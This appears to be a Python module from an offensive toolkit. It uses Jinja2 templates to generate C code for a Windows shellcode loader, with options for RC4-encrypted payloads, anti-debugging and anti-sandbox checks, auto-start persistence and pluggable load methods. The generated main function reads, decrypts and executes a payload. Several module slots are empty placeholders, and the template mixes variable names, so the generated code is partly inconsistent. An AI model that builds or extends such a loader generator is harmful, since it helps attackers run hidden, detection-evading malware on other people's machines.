"""
模板渲染器：使用 Jinja2 渲染 C 代码模板。
"""
import os
from pathlib import Path
from typing import Dict, Any, Optional
import re

try:
    from jinja2 import Environment, FileSystemLoader, TemplateNotFound
    JINJA2_AVAILABLE = True
except ImportError:
    JINJA2_AVAILABLE = False


class TemplateRenderer:
    """模板渲染器"""
    
    def __init__(self, template_dir: str = "templates"):
        self.template_dir = Path(template_dir)
        self.env = None
        self._init_environment()
    
    def _init_environment(self):
        """初始化 Jinja2 环境"""
        if not JINJA2_AVAILABLE:
            raise RuntimeError("Jinja2 未安装，请运行 'pip install Jinja2'")
        
        if not self.template_dir.exists():
            raise FileNotFoundError(f"模板目录不存在: {self.template_dir}")
        
        self.env = Environment(
            loader=FileSystemLoader(self.template_dir),
            trim_blocks=True,
            lstrip_blocks=True,
            keep_trailing_newline=True
        )
        
        # 添加自定义过滤器
        self.env.filters['c_bool'] = lambda x: "TRUE" if x else "FALSE"
        self.env.filters['c_hex_array'] = self._c_hex_array_filter
    
    def _c_hex_array_filter(self, key_str: str) -> str:
        """将字符串转换为 C 十六进制数组"""
        if not key_str:
            return ""
        bytes_list = [f"0x{ord(c):02x}" for c in key_str]
        return "{ " + ", ".join(bytes_list) + ", 0x00 }"
    
    def render_template(self, template_name: str, context: Dict[str, Any]) -> str:
        """渲染模板"""
        if not self.env:
            self._init_environment()
        
        try:
            template = self.env.get_template(template_name)
        except TemplateNotFound:
            raise FileNotFoundError(f"模板未找到: {template_name}")
        
        rendered = template.render(**context)
        # 格式化：去除多余空行
        formatted = re.sub(r'\n\s*\n', '\n', rendered).strip()
        return formatted
    
    def render_full_loader(self, config: Any) -> str:
        """渲染完整的加载器代码"""
        # 构建上下文
        context = self._build_context_from_config(config)
        
        # 渲染基础模板
        return self.render_template("base.c.j2", context)
    
    def _build_context_from_config(self, config) -> Dict[str, Any]:
        """从配置对象构建模板上下文"""
        # 这里需要根据配置生成各个模块的代码
        # 为了简化，我们暂时使用占位符
        # 实际实现中，应该从各个模块模板渲染
        
        # 示例：生成调试宏
        debug_macro = "#define _DEBUG" if getattr(config, 'enable_debug', False) else ""
        
        # 生成密钥代码
        key_code = ""
        if getattr(config, 'encrypt_shellcode', False) and getattr(config, 'encryption_key', None):
            key_bytes = [f"0x{ord(c):02x}" for c in config.encryption_key]
            key_code = f"""
            // 解密密钥（用户指定，字符串转字节数组）
            unsigned char g_encryption_key[] = {{ {', '.join(key_bytes)}, 0x00 }};
            unsigned int g_key_len = {len(config.encryption_key)};
            """
        
        # 加载方式代码（从注册表获取）
        from load_method_registry import registry
        load_method_code = registry.generate(config.load_method, arch=config.arch)
        
        # 其他模块代码（可以从模块模板渲染）
        rc4_code = self._render_module("modules/rc4.c.j2", {})
        
        # 构建上下文
        return {
            "debug_macro": debug_macro,
            "api_mapping": "",
            "key_code": key_code,
            "rc4_code": rc4_code,
            "read_local_shellcode_code": "",
            "anti_debug_code": "",
            "anti_sandbox_code": "",
            "auto_start_code": "",
            "dynamic_resolve_code": "",
            "load_method_code": load_method_code,
            "main_code": self._generate_main_code(config),
        }
    
    def _render_module(self, module_name: str, context: Dict[str, Any]) -> str:
        """渲染模块模板"""
        try:
            return self.render_template(module_name, context)
        except FileNotFoundError:
            # 模块不存在，返回空字符串
            return ""
    
    def _generate_main_code(self, config) -> str:
        """生成主函数代码"""
        # 简化版本，实际应根据配置生成
        return f"""
        int main() {{
            CHAR* buffer = "{config.shellcode_path}";
            DWORD bufferSize = 0;

            // 反检测逻辑
            {'if (CheckDebugger()) {{ return -1; }}' if getattr(config, 'anti_debug', False) else ''}
            {'if (CheckSandbox()) {{ return -1; }}' if getattr(config, 'anti_sandbox', False) else ''}

            // 自启动配置
            {'AutoStart();' if getattr(config, 'auto_start', False) else ''}

            // 读取并处理Shellcode
            if (!ReadAndProcessPayload(&buffer, &bufferSize)) {{
                #ifdef _DEBUG
                printf("[!] 读取Shellcode失败\\n");
                #endif
                return -1;
            }}

            // 解密Shellcode（若启用）
            {'RC4Crypt(shellcode, shellcodeSize, g_encryption_key, g_key_len);' if getattr(config, 'encrypt_shellcode', False) else ''}

            #ifdef _DEBUG
            printf("[*] 成功处理Shellcode，大小: %d 字节\\n", bufferSize);
            printf("[*] 加载方式: {config.load_method}\\n");
            #endif

            // 执行加载逻辑
            ExecuteLoader((PBYTE)buffer, bufferSize);

            LocalFree(buffer);  // 释放Shellcode内存
            return 0;
        }}
        """


# 全局渲染器实例
_renderer: Optional[TemplateRenderer] = None


def get_renderer() -> TemplateRenderer:
    """获取全局渲染器实例"""
    global _renderer
    if _renderer is None:
        _renderer = TemplateRenderer()
    return _renderer


def render_full_loader(config) -> str:
    """渲染完整加载器代码（便捷函数）"""
    return get_renderer().render_full_loader(config)